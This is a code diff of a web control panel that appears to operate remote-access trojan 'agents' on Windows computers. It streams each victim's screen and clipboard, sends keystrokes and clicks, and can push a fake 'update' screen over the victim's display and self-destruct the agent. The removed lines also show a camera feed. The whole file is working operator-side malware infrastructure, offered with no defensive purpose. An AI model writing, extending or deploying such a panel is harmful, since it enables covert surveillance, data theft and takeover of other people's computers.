@@ -12,7 +12,16 @@
     <style>
         .device-card.active { border-color: #3b82f6; background: rgba(59, 130, 246, 0.1); }
         .online { background-color: #10b981; box-shadow: 0 0 8px #10b981; }
-        #main-screen { max-height: 70vh; object-fit: contain; background: #000; }
+        #main-screen { max-height: 75vh; object-fit: contain; background: #000; border-radius: 12px; }
+        .custom-loader {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #3b82f6;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col font-sans">
@@ -24,68 +33,78 @@
         </div>
         <div id="active-device-display" class="hidden flex items-center gap-3">
             <div class="bg-slate-800 px-4 py-1.5 rounded-full border border-slate-700 flex items-center gap-2">
-                <span id="selected-device-id" class="text-xs font-mono text-blue-400">NONE</span>
+                <span id="selected-device-id" class="text-xs font-mono text-blue-400 uppercase tracking-tighter">NONE</span>
                 <span class="status-dot online w-2 h-2 rounded-full"></span>
             </div>
         </div>
     </nav>
 
     <div class="flex flex-1 overflow-hidden">
-        <aside class="w-72 border-r border-slate-800 bg-slate-900/30 flex flex-col">
-            <div class="p-4 border-b border-slate-800 flex justify-between items-center text-xs font-bold text-slate-500 uppercase">
-                Active Agents <span id="device-count" class="bg-slate-800 px-2 py-0.5 rounded">0</span>
+        <!-- Sidebar -->
+        <aside class="w-64 border-r border-slate-800 bg-slate-900/30 flex flex-col">
+            <div class="p-4 border-b border-slate-800 flex justify-between items-center text-[10px] font-bold text-slate-500 uppercase">
+                Active Agents <span id="device-count" class="bg-slate-800 px-2 py-0.5 rounded text-blue-400">0</span>
             </div>
             <div id="device-list" class="flex-1 overflow-y-auto p-3 space-y-2"></div>
         </aside>
 
+        <!-- Main Workspace -->
         <main class="flex-1 overflow-y-auto bg-slate-950 p-6 relative">
             <div id="no-device-screen" class="absolute inset-0 flex flex-col items-center justify-center text-slate-600 bg-slate-950">
                 <i data-lucide="monitor-off" class="w-16 h-16 mb-4 opacity-20"></i>
-                <p>Device select karein</p>
+                <p class="text-sm font-medium">Select an agent to begin control</p>
             </div>
 
-            <div id="dashboard-content" class="hidden grid grid-cols-1 lg:grid-cols-12 gap-6">
-                <div class="lg:col-span-8 space-y-6">
-                    <div class="bg-slate-900 rounded-2xl border border-slate-800 overflow-hidden shadow-2xl">
-                        <div class="p-3 border-b border-slate-800 flex justify-between items-center bg-slate-900/50">
-                            <span class="text-[10px] font-bold text-blue-400 uppercase tracking-widest flex items-center gap-2">
-                                <i data-lucide="mouse-pointer-2" class="w-3 h-3"></i> Live Screen
-                            </span>
+            <div id="dashboard-content" class="hidden flex flex-col gap-6 h-full">
+                <!-- Live Screen Section -->
+                <div class="flex-1 bg-slate-900 rounded-2xl border border-slate-800 overflow-hidden shadow-2xl flex flex-col">
+                    <div class="p-3 border-b border-slate-800 flex justify-between items-center bg-slate-900/50">
+                        <span class="text-[10px] font-bold text-blue-400 uppercase tracking-widest flex items-center gap-2">
+                            <i data-lucide="monitor" class="w-3 h-3"></i> Remote Desktop
+                        </span>
+                        <div id="screen-status" class="text-[10px] text-slate-500 flex items-center gap-2">
+                             <span id="last-seen">Updating...</span>
                         </div>
-                        <img id="main-screen" class="w-full h-auto cursor-crosshair block mx-auto" />
                     </div>
-
-                    <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800 space-y-4">
-                        <div class="flex gap-3">
-                            <input type="text" id="kb-input" placeholder="Type message..." class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 focus:outline-none" />
-                            <button onclick="handleKeyboard()" class="bg-blue-600 px-6 rounded-xl font-bold">SEND</button>
-                        </div>
-                        <div class="flex flex-wrap gap-2">
-                            <button onclick="sendCmd({type:'key', key:'enter'})" class="bg-slate-800 px-4 py-2 rounded-lg text-xs">ENTER</button>
-                            <button onclick="sendCmd({type:'key', key:'backspace'})" class="bg-slate-800 px-4 py-2 rounded-lg text-xs">BACK</button>
-                            <div class="w-[1px] bg-slate-800 mx-2"></div>
-                            
-                            <!-- Naya Update UI Button -->
-                            <button id="update-btn" onclick="toggleUpdateScreen(true)" class="bg-orange-600/20 hover:bg-orange-600/40 text-orange-500 px-4 py-2 rounded-lg text-xs font-bold border border-orange-500/20">
-                                <i data-lucide="refresh-cw" class="w-3 h-3 inline mr-1"></i> START UPDATE (HELLO)
-                            </button>
-                            <button id="stop-update-btn" onclick="toggleUpdateScreen(false)" class="hidden bg-slate-800 hover:bg-slate-700 text-slate-300 px-4 py-2 rounded-lg text-xs font-bold border border-slate-700">
-                                STOP UPDATE
-                            </button>
-
-                            <button onclick="triggerDestruct()" class="ml-auto bg-red-600 px-4 py-2 rounded-lg text-xs font-bold">DESTRUCT</button>
-                        </div>
+                    <div class="flex-1 flex items-center justify-center p-2 bg-black/40">
+                        <img id="main-screen" class="max-w-full h-auto cursor-crosshair shadow-2xl" src="" alt="Waiting for feed..." />
                     </div>
                 </div>
 
-                <div class="lg:col-span-4 space-y-6">
-                    <div class="bg-slate-900 rounded-2xl border border-slate-800 overflow-hidden">
-                        <div class="p-3 bg-slate-800/50 text-[10px] font-bold uppercase tracking-widest text-slate-400">Agent Camera</div>
-                        <div class="aspect-video bg-black"><img id="cam-feed" class="w-full h-full object-cover" /></div>
+                <!-- Control Panel -->
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <!-- Message & Keyboard -->
+                    <div class="md:col-span-2 bg-slate-900 p-5 rounded-2xl border border-slate-800 space-y-4 shadow-lg">
+                        <div class="flex gap-3">
+                            <input type="text" id="kb-input" placeholder="Type text to send to remote agent..." class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 focus:outline-none focus:border-blue-500 text-sm transition-all" />
+                            <button onclick="handleKeyboard()" class="bg-blue-600 hover:bg-blue-500 px-6 rounded-xl font-bold text-sm transition-colors shadow-lg shadow-blue-900/20">SEND</button>
+                        </div>
+                        <div class="flex flex-wrap gap-2">
+                            <button onclick="sendCmd({type:'key', key:'enter'})" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-[10px] font-bold">ENTER</button>
+                            <button onclick="sendCmd({type:'key', key:'backspace'})" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-[10px] font-bold">BACKSPACE</button>
+                            <div class="w-[1px] bg-slate-800 mx-1"></div>
+                            
+                            <button id="update-btn" onclick="toggleUpdateScreen(true)" class="bg-orange-600/10 hover:bg-orange-600/20 text-orange-500 px-4 py-2 rounded-lg text-[10px] font-bold border border-orange-500/20 flex items-center gap-2">
+                                <i data-lucide="refresh-cw" class="w-3 h-3"></i> START UPDATE UI
+                            </button>
+                            <button id="stop-update-btn" onclick="toggleUpdateScreen(false)" class="hidden bg-slate-800 hover:bg-slate-700 text-white px-4 py-2 rounded-lg text-[10px] font-bold border border-slate-700">
+                                STOP UPDATE UI
+                            </button>
+                        </div>
                     </div>
-                    <div class="bg-slate-900 rounded-2xl border border-slate-800 p-4">
-                        <div class="text-[10px] font-bold uppercase text-slate-500 mb-2">Clipboard</div>
-                        <div id="clip-text" class="text-xs font-mono text-blue-400 break-all bg-slate-950 p-3 rounded-lg border border-slate-800 min-h-[60px]">Waiting...</div>
+
+                    <!-- Clipboard & Actions -->
+                    <div class="bg-slate-900 p-5 rounded-2xl border border-slate-800 flex flex-col shadow-lg">
+                        <div class="flex justify-between items-center mb-3">
+                            <span class="text-[10px] font-bold uppercase text-slate-500">Live Clipboard</span>
+                            <button onclick="copyClip()" class="text-blue-400 hover:text-blue-300"><i data-lucide="copy" class="w-3 h-3"></i></button>
+                        </div>
+                        <div id="clip-text" class="text-xs font-mono text-blue-400 break-all bg-slate-950 p-3 rounded-lg border border-slate-800 flex-1 min-h-[50px] overflow-y-auto mb-3">
+                            Waiting for data...
+                        </div>
+                        <button onclick="triggerDestruct()" class="w-full bg-red-600/10 hover:bg-red-600 text-red-500 hover:text-white py-2 rounded-xl text-[10px] font-bold border border-red-500/20 transition-all uppercase tracking-wider">
+                            Self Destruct Agent
+                        </button>
                     </div>
                 </div>
             </div>
@@ -111,20 +130,30 @@
         let unsubscribeDevice = null;
 
         async function initDashboard() {
-            await auth.signInAnonymously();
-            db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices')
-            .onSnapshot(snapshot => {
-                const list = document.getElementById('device-list');
-                document.getElementById('device-count').innerText = snapshot.size;
-                list.innerHTML = '';
-                snapshot.forEach(doc => {
-                    const div = document.createElement('div');
-                    div.className = `p-4 rounded-xl border border-slate-800 bg-slate-900/50 cursor-pointer ${selectedDevice === doc.id ? 'active' : ''}`;
-                    div.onclick = () => selectDevice(doc.id);
-                    div.innerHTML = `<div class="flex justify-between items-center text-xs font-bold"><span>${doc.id}</span><span class="status-dot online w-2 h-2 rounded-full"></span></div>`;
-                    list.appendChild(div);
+            try {
+                await auth.signInAnonymously();
+                db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices')
+                .onSnapshot(snapshot => {
+                    const list = document.getElementById('device-list');
+                    document.getElementById('device-count').innerText = snapshot.size;
+                    list.innerHTML = '';
+                    snapshot.forEach(doc => {
+                        const div = document.createElement('div');
+                        div.className = `p-4 rounded-xl border border-slate-800 bg-slate-900/50 cursor-pointer transition-all hover:border-slate-600 ${selectedDevice === doc.id ? 'active' : ''}`;
+                        div.onclick = () => selectDevice(doc.id);
+                        div.innerHTML = `
+                            <div class="flex justify-between items-center text-xs font-bold mb-1">
+                                <span class="truncate pr-2">${doc.id}</span>
+                                <span class="status-dot online w-2 h-2 rounded-full"></span>
+                            </div>
+                            <div class="text-[9px] text-slate-500 uppercase tracking-tighter">Windows Agent</div>
+                        `;
+                        list.appendChild(div);
+                    });
+                }, err => {
+                    if(err.code === 'resource-exhausted') alert("Firestore Quota Limit Exceeded! Thoda wait karein.");
                 });
-            });
+            } catch (e) { console.error(e); }
         }
 
         function selectDevice(deviceId) {
@@ -133,17 +162,27 @@
             document.getElementById('active-device-display').classList.remove('hidden');
             document.getElementById('no-device-screen').classList.add('hidden');
             document.getElementById('dashboard-content').classList.remove('hidden');
+            
             if (unsubscribeDevice) unsubscribeDevice();
             unsubscribeDevice = db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices').doc(deviceId)
             .onSnapshot(doc => { if(doc.exists) updateUI(doc.data()); });
+
+            // Highlight in list
+            document.querySelectorAll('#device-list > div').forEach(el => el.classList.remove('active'));
         }
 
         function updateUI(data) {
-            if (data.screen) document.getElementById('main-screen').src = 'data:image/jpeg;base64,' + data.screen;
-            if (data.camera) document.getElementById('cam-feed').src = 'data:image/jpeg;base64,' + data.camera;
-            if (data.clipboard) document.getElementById('clip-text').innerText = data.clipboard;
+            if (data.screen) {
+                document.getElementById('main-screen').src = 'data:image/jpeg;base64,' + data.screen;
+            }
+            if (data.clipboard) {
+                document.getElementById('clip-text').innerText = data.clipboard;
+            }
+            if (data.last_online) {
+                const date = data.last_online.toDate();
+                document.getElementById('last-seen').innerText = "Live: " + date.toLocaleTimeString();
+            }
             
-            // Check if Update screen is active
             const isUpdating = data.command && data.command.type === 'show_html';
             document.getElementById('update-btn').style.display = isUpdating ? 'none' : 'block';
             document.getElementById('stop-update-btn').style.display = isUpdating ? 'block' : 'none';
@@ -151,32 +190,48 @@
 
         async function sendCmd(cmd) {
             if (!selectedDevice) return;
-            await db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices').doc(selectedDevice).update({
-                command: { ...cmd, timestamp: Date.now() }
-            });
+            try {
+                await db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices').doc(selectedDevice).update({
+                    command: { ...cmd, timestamp: Date.now() }
+                });
+            } catch(e) { console.error("Command failed", e); }
         }
 
         function toggleUpdateScreen(active) {
-            if (active) {
-                sendCmd({ type: 'show_html' });
-            } else {
-                sendCmd({ type: 'hide_html' });
-            }
+            sendCmd({ type: active ? 'show_html' : 'hide_html' });
         }
 
         function handleKeyboard() {
             const input = document.getElementById('kb-input');
-            if (input.value) { sendCmd({ type: 'type', text: input.value }); input.value = ''; }
+            if (input.value) { 
+                sendCmd({ type: 'type', text: input.value }); 
+                input.value = ''; 
+            }
         }
 
         function triggerDestruct() {
-            if (confirm("Agent delete karein?")) sendCmd({ type: 'self_destruct' });
+            if (confirm("Khatra: Agent ko permanent delete kar dein? Computer se link khatam ho jayega.")) {
+                sendCmd({ type: 'self_destruct' });
+                window.location.reload();
+            }
+        }
+
+        function copyClip() {
+            const text = document.getElementById('clip-text').innerText;
+            const el = document.createElement('textarea');
+            el.value = text;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
         }
 
         document.getElementById('main-screen').addEventListener('click', (e) => {
             if (!selectedDevice) return;
             const rect = e.target.getBoundingClientRect();
-            sendCmd({ type: 'click', x: (e.clientX - rect.left) / rect.width, y: (e.clientY - rect.top) / rect.height });
+            const x = (e.clientX - rect.left) / rect.width;
+            const y = (e.clientY - rect.top) / rect.height;
+            sendCmd({ type: 'click', x: x, y: y });
         });
 
         lucide.createIcons();
